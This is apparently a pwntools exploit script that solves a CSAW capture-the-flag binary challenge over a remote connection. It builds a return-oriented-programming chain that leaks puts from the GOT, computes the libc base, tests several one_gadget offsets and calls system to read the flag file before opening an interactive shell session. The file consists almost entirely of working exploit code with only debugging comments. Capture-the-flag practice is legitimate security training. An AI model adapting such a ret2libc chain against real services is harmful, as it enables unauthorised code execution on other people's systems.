#!/usr/bin/env python

from pwn import *

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
print "preloaded!", env
# context.terminal = ["bash"]

# raw_input("Start?\n")

# r = process("./adhd", env=env)
# gdb.attach(r, '''
# 	set disable-randomization off
# 	b *0x4005f7	
# 	c
# 	''')
r = remote("pwn.chal.csaw.io", 10102)

# r = remote("127.0.0.1", 6969)

r.recvuntil("Give give:\n")

payload = ''
payload += p64(0x4006a3) # pop rdi; ret
payload += p64(0x600fd8) # puts@GOT
# payload += p64(0x600ff0) # libc_start_main@GOT
payload += p64(0x4005f2) # puts() in main

r.send(payload)

leak = u64(r.recvline().strip() + '\x00\x00') # leak is address of puts
print "leak: ", hex(leak)

BASE = leak - 0x6f690 # thanks libc-database
# one_gadget = BASE + 0x45216 # constraint: $rax is NULL (doesn't work)
# one_gadget = BASE + 0x4526a # constraint: $rsp+0x30 is NULL (why does this redirect to puts?)
# one_gadget = BASE + 0xf0274 # constraint: $rsp+0x50 is NULL
one_gadget = BASE + 0xf1117 # constraint: $rsp+0x70 is NULL
system = leak - 0x2a300
binsh = system + 0x147987
execve = system + 0x873e0
gadget = 0x400616 # xor rcx, edx, rsi, ret

# print "one_gadget location:", hex(one_gadget)
print "system", hex(system)

payload = ''
payload += "/bin/cat flag.*\x00" # dummy address
# payload += "//bin/sh" # dummy address
payload += p64(gadget)
payload += p64(0x4006a3)
payload += p64(binsh+0x40)
# payload += p64(0x4006a1)
# payload += p64(binsh)
# payload += p64(binsh)
# payload += "/bin/cat flag.*\x00"
payload += p64(system) #jumps to this location!
r.send(payload)

r.interactive()